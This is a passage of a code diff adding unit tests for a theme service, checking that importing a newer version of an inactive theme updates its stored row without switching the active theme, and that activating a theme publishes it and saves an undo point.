+    expect([...livePublished.keys()]).toContain("home");
+    expect(library.rows.get("aurora")!.version).toBe("1.1.0");
+  });
+
+  it("refreshes an INACTIVE theme's row on update, still without switching", async () => {
+    await putOn(themePackage({ id: "aurora" }), "u1");
+    await themeService.importTheme(themePackage({ id: "meadow", version: "1.0.0" }), "u1");
+    await themeService.importTheme(themePackage({ id: "meadow", version: "2.0.0" }), "u1");
+
+    expect(library.rows.get("meadow")!.version).toBe("2.0.0");
+    expect(library.rows.get("meadow")!.active).toBe(false);
+    expect(library.rows.get("aurora")!.active).toBe(true);
+  });
+
+  it("the switch, when chosen, is the ordinary activate — live, with an undo point", async () => {
+    await themeService.importTheme(themePackage({ id: "meadow" }), "u1");
+    await themeService.activateTheme("meadow", "u1");
+
+    expect(library.rows.get("meadow")!.active).toBe(true);
+    expect([...livePublished.keys()]).toContain("home");
+    expect(rollbackProbe.saved).toBeTruthy();
   });
 });
